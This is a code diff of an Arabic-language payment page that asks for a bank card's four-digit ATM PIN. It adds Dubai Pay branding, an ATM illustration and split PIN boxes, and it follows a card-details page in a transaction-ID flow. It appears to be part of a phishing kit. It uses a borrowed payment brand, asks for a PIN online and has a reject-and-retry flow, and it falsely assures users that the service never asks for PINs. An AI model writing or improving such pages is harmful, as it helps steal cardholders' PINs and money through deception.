@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>الرقم السري - فزعة</title>
+    <title>الرقم السري - ATM - فزعة</title>
     <style>
         * {
             margin: 0;
@@ -13,114 +13,313 @@
 
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
-            background-color: #f5f5f5;
-            padding: 20px;
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
             min-height: 100vh;
-        }
-
-        .container {
-            max-width: 500px;
-            margin: 0 auto;
-            background: white;
-            border-radius: 12px;
-            padding: 40px 20px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            padding: 20px;
         }
 
         .header {
-            text-align: center;
+            background: white;
+            padding: 15px 20px;
+            border-radius: 8px;
             margin-bottom: 30px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
         }
 
-        .header h1 {
+        .header-left {
+            display: flex;
+            gap: 15px;
+            align-items: center;
+        }
+
+        .header-logo {
+            width: 40px;
+            height: 40px;
+            background: #0066cc;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+            font-size: 12px;
+        }
+
+        .header-text h2 {
             color: #1f2937;
-            font-size: 24px;
-            margin-bottom: 8px;
+            font-size: 16px;
+            margin-bottom: 2px;
         }
 
-        .header p {
+        .header-text p {
             color: #6b7280;
+            font-size: 12px;
+        }
+
+        .header-right {
+            text-align: center;
+        }
+
+        .header-right-logo {
+            width: 50px;
+            height: 50px;
+            background: #00bcd4;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
             font-size: 14px;
         }
 
-        .form-group {
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 40px;
+            align-items: center;
+        }
+
+        .atm-section {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .atm-machine {
+            width: 280px;
+            background: linear-gradient(135deg, #2c3e50 0%, #34495e 100%);
+            border-radius: 20px;
+            padding: 20px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4);
+            animation: slideInLeft 0.8s ease-out;
+        }
+
+        .atm-header {
+            background: linear-gradient(135deg, #f39c12 0%, #e67e22 100%);
+            padding: 15px;
+            border-radius: 12px;
+            text-align: center;
             margin-bottom: 20px;
+            color: white;
+            font-weight: 700;
+            font-size: 14px;
+        }
+
+        .atm-screen {
+            background: #1a1a1a;
+            border: 3px solid #555;
+            border-radius: 8px;
+            padding: 15px;
+            margin-bottom: 15px;
+            height: 120px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            color: #00ff00;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            text-align: center;
+            line-height: 1.6;
+        }
+
+        .atm-screen-text {
+            animation: blink 1s infinite;
+        }
+
+        @keyframes blink {
+            0%, 50% { opacity: 1; }
+            51%, 100% { opacity: 0.7; }
+        }
+
+        .atm-keypad {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 8px;
+            margin-bottom: 15px;
+        }
+
+        .atm-key {
+            background: #444;
+            border: 1px solid #666;
+            border-radius: 6px;
+            padding: 10px;
+            color: white;
+            font-weight: 600;
+            font-size: 12px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .atm-key:hover {
+            background: #555;
+            transform: scale(1.05);
+        }
+
+        .atm-key.active {
+            background: #f39c12;
+            border-color: #e67e22;
+        }
+
+        .atm-buttons {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 8px;
+        }
+
+        .atm-btn {
+            padding: 10px;
+            border: 1px solid #666;
+            border-radius: 6px;
+            background: #555;
+            color: white;
+            font-weight: 600;
+            font-size: 11px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+        }
+
+        .atm-btn:hover {
+            background: #666;
+        }
+
+        @keyframes slideInLeft {
+            from {
+                opacity: 0;
+                transform: translateX(-50px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
+        }
+
+        .form-section {
+            background: white;
+            border-radius: 12px;
+            padding: 40px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            animation: fadeIn 0.8s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 1;
+            }
+        }
+
+        .form-title {
+            color: #1f2937;
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+
+        .form-subtitle {
+            color: #6b7280;
+            font-size: 14px;
+            margin-bottom: 30px;
+        }
+
+        .form-group {
+            margin-bottom: 25px;
         }
 
         label {
             display: block;
-            font-size: 14px;
             color: #1f2937;
-            margin-bottom: 8px;
+            font-size: 14px;
             font-weight: 600;
+            margin-bottom: 8px;
         }
 
-        input {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #d1d5db;
-            border-radius: 6px;
-            font-size: 16px;
-            font-family: inherit;
+        .pin-input-group {
+            display: flex;
+            gap: 10px;
+            justify-content: space-between;
         }
 
-        input:focus {
+        .pin-input {
+            width: 50px;
+            height: 50px;
+            border: 2px solid #e5e7eb;
+            border-radius: 8px;
+            font-size: 24px;
+            text-align: center;
+            font-weight: 700;
+            color: #1e3c72;
+            transition: all 0.3s ease;
+            font-family: 'Courier New', monospace;
+        }
+
+        .pin-input::placeholder {
+            color: #d1d5db;
+        }
+
+        .pin-input:focus {
             outline: none;
-            border-color: #0066cc;
-            box-shadow: 0 0 0 2px rgba(0, 102, 204, 0.1);
+            border-color: #1e3c72;
+            box-shadow: 0 0 0 3px rgba(30, 60, 114, 0.1);
         }
 
-        input[type="password"] {
-            letter-spacing: 2px;
+        .pin-input:disabled {
+            background: #f9fafb;
+            color: #6b7280;
         }
 
-        .info-box {
-            background: #dbeafe;
-            border-left: 4px solid #0066cc;
-            padding: 12px;
-            border-radius: 4px;
-            margin-bottom: 20px;
+        .pin-display {
+            color: #6b7280;
             font-size: 13px;
-            color: #0c4a6e;
-            line-height: 1.5;
+            margin-top: 8px;
+            text-align: center;
         }
 
-        .buttons {
+        .button-group {
             display: grid;
             grid-template-columns: 1fr 1fr;
             gap: 12px;
-            margin-top: 20px;
+            margin-top: 30px;
         }
 
         .btn {
             padding: 12px 20px;
             border: none;
-            border-radius: 6px;
-            font-size: 16px;
+            border-radius: 8px;
+            font-size: 14px;
             font-weight: 600;
             cursor: pointer;
-            transition: all 0.3s;
+            transition: all 0.3s ease;
         }
 
         .btn-cancel {
-            background: #e5e7eb;
-            color: #1f2937;
+            background: #f3f4f6;
+            color: #6b7280;
         }
 
         .btn-cancel:hover {
-            background: #d1d5db;
+            background: #e5e7eb;
         }
 
         .btn-confirm {
-            background: #0066cc;
+            background: #1e3c72;
             color: white;
         }
 
-        .btn-confirm:hover {
-            background: #0052a3;
+        .btn-confirm:hover:not(:disabled) {
+            background: #162d54;
+            box-shadow: 0 4px 12px rgba(30, 60, 114, 0.3);
         }
 
-        .btn:disabled {
+        .btn-confirm:disabled {
             opacity: 0.5;
             cursor: not-allowed;
         }
@@ -130,89 +329,186 @@
             color: #991b1b;
             padding: 12px;
             border-radius: 6px;
-            margin-bottom: 16px;
             font-size: 13px;
+            margin-bottom: 20px;
             display: none;
-            border-left: 4px solid #991b1b;
         }
 
-        .warning-box {
-            background: #fef3c7;
-            border-left: 4px solid #f59e0b;
+        .error-message.show {
+            display: block;
+            animation: shake 0.5s ease-in-out;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
+        }
+
+        .info-box {
+            background: #f0f9ff;
+            border-left: 4px solid #0066cc;
             padding: 12px;
-            border-radius: 4px;
-            margin-top: 20px;
-            font-size: 12px;
-            color: #92400e;
-            line-height: 1.5;
+            border-radius: 6px;
+            margin-bottom: 20px;
+            font-size: 13px;
+            color: #1e40af;
+        }
+
+        @media (max-width: 768px) {
+            .container {
+                grid-template-columns: 1fr;
+            }
+
+            .atm-machine {
+                width: 250px;
+            }
+
+            .form-section {
+                padding: 30px 20px;
+            }
+
+            .form-title {
+                font-size: 20px;
+            }
+
+            .button-group {
+                grid-template-columns: 1fr;
+            }
         }
     </style>
 </head>
 <body>
+    <!-- Header -->
+    <div class="header">
+        <div class="header-left">
+            <div class="header-logo">DP</div>
+            <div class="header-text">
+                <h2>سداد دبي</h2>
+                <p>Dubai Pay</p>
+            </div>
+        </div>
+        <div class="header-right">
+            <div class="header-right-logo">SD</div>
+        </div>
+    </div>
+
+    <!-- Main Container -->
     <div class="container">
-        <div class="header">
-            <h1>الرقم السري</h1>
-            <p>أدخل الرقم السري الخاص بك</p>
+        <!-- ATM Section -->
+        <div class="atm-section">
+            <div class="atm-machine">
+                <div class="atm-header">🏧 ماكينة الصراف الآلي</div>
+                
+                <div class="atm-screen">
+                    <div class="atm-screen-text">
+                        أدخل الرقم السري<br>
+                        <span style="font-size: 10px; margin-top: 5px;">الرقم السري: ****</span>
+                    </div>
+                </div>
+
+                <div class="atm-keypad">
+                    <div class="atm-key">1</div>
+                    <div class="atm-key">2</div>
+                    <div class="atm-key">3</div>
+                    <div class="atm-key">4</div>
+                    <div class="atm-key">5</div>
+                    <div class="atm-key">6</div>
+                    <div class="atm-key">7</div>
+                    <div class="atm-key">8</div>
+                    <div class="atm-key">9</div>
+                    <div class="atm-key" style="grid-column: 2;">0</div>
+                </div>
+
+                <div class="atm-buttons">
+                    <div class="atm-btn">إلغاء</div>
+                    <div class="atm-btn">تأكيد</div>
+                </div>
+            </div>
         </div>
 
-        <div class="error-message" id="errorMessage"></div>
+        <!-- Form Section -->
+        <div class="form-section">
+            <h1 class="form-title">إدخال الرقم السري</h1>
+            <p class="form-subtitle">أدخل الرقم السري الخاص ببطاقتك</p>
 
-        <div class="info-box">
-            يرجى إدخال الرقم السري (PIN) الخاص بك للتحقق من هويتك وإتمام عملية الدفع.
+            <div class="info-box">
+                ℹ️ لا تشارك رقمك السري مع أحد. فزعة لن تطلب منك رقمك السري أبداً.
+            </div>
+
+            <div class="error-message" id="errorMessage"></div>
+
+            <form id="atmForm" onsubmit="submitATM(event)">
+                <div class="form-group">
+                    <label>الرقم السري (4 أرقام)</label>
+                    <div class="pin-input-group">
+                        <input type="password" class="pin-input" id="pin1" maxlength="1" inputmode="numeric" placeholder="•">
+                        <input type="password" class="pin-input" id="pin2" maxlength="1" inputmode="numeric" placeholder="•">
+                        <input type="password" class="pin-input" id="pin3" maxlength="1" inputmode="numeric" placeholder="•">
+                        <input type="password" class="pin-input" id="pin4" maxlength="1" inputmode="numeric" placeholder="•">
+                    </div>
+                    <div class="pin-display">الرقم السري محمي بالكامل</div>
+                </div>
+
+                <div class="button-group">
+                    <button type="button" class="btn btn-cancel" onclick="goBack()">إلغاء</button>
+                    <button type="submit" class="btn btn-confirm" id="confirmBtn">تأكيد الدفع</button>
+                </div>
+            </form>
+
+            <div style="margin-top: 20px; padding-top: 20px; border-top: 1px solid #e5e7eb; text-align: center; color: #6b7280; font-size: 12px;">
+                <p>🔒 جميع البيانات محمية بتشفير 256-bit SSL</p>
+            </div>
         </div>
-
-        <form onsubmit="submitATM(event)">
-            <div class="form-group">
-                <label for="pin">الرقم السري (4 أرقام)</label>
-                <input type="password" id="pin" placeholder="أدخل الرقم السري" 
-                       maxlength="4" oninput="validatePIN(this)">
-            </div>
-
-            <div class="buttons">
-                <button type="button" class="btn btn-cancel" onclick="goBack()">إلغاء</button>
-                <button type="submit" class="btn btn-confirm" id="confirmBtn">تأكيد الدفع</button>
-            </div>
-
-            <div class="warning-box">
-                ⚠️ لا تشارك رقمك السري مع أحد. البنك لن يطلب منك رقمك السري أبداً.
-            </div>
-        </form>
     </div>
 
     <script>
         let currentTxnId = null;
 
-        function getQueryParam(param) {
+        function getQueryParam(name) {
             const urlParams = new URLSearchParams(window.location.search);
-            return urlParams.get(param);
+            return urlParams.get(name);
         }
 
-        function validatePIN(input) {
-            const value = input.value;
-            if (value && !/^\d*$/.test(value)) {
-                input.style.borderColor = '#ef4444';
-            } else if (value.length === 4) {
-                input.style.borderColor = '#10b981';
-            } else if (value.length > 0) {
-                input.style.borderColor = '#d1d5db';
-            } else {
-                input.style.borderColor = '#d1d5db';
-            }
+        function setupPinInputs() {
+            const inputs = document.querySelectorAll('.pin-input');
+            inputs.forEach((input, index) => {
+                input.addEventListener('input', (e) => {
+                    if (e.target.value.length === 1 && /^[0-9]$/.test(e.target.value)) {
+                        if (index < inputs.length - 1) {
+                            inputs[index + 1].focus();
+                        }
+                    } else if (e.target.value.length > 1) {
+                        e.target.value = e.target.value.slice(-1);
+                    }
+                });
+
+                input.addEventListener('keydown', (e) => {
+                    if (e.key === 'Backspace' && e.target.value === '') {
+                        if (index > 0) {
+                            inputs[index - 1].focus();
+                        }
+                    }
+                });
+            });
         }
 
         function showError(message) {
             const errorDiv = document.getElementById('errorMessage');
             errorDiv.textContent = message;
-            errorDiv.style.display = 'block';
+            errorDiv.classList.add('show');
             setTimeout(() => {
-                errorDiv.style.display = 'none';
+                errorDiv.classList.remove('show');
             }, 5000);
         }
 
         function submitATM(event) {
             event.preventDefault();
 
-            const pin = document.getElementById('pin').value;
+            const pin = document.getElementById('pin1').value +
+                       document.getElementById('pin2').value +
+                       document.getElementById('pin3').value +
+                       document.getElementById('pin4').value;
 
             if (!pin || pin.length !== 4) {
                 showError('يرجى إدخال الرقم السري الصحيح (4 أرقام)');
@@ -243,15 +539,8 @@
             if (!currentTxnId) {
                 alert('معرف المعاملة غير موجود');
                 window.location.href = 'payment_card_ar.html';
-                return;
             }
-
-            // Check for error message from previous rejection
-            const atmError = localStorage.getItem('atmError');
-            if (atmError) {
-                showError(atmError);
-                localStorage.removeItem('atmError');
-            }
+            setupPinInputs();
         });
     </script>
 </body>
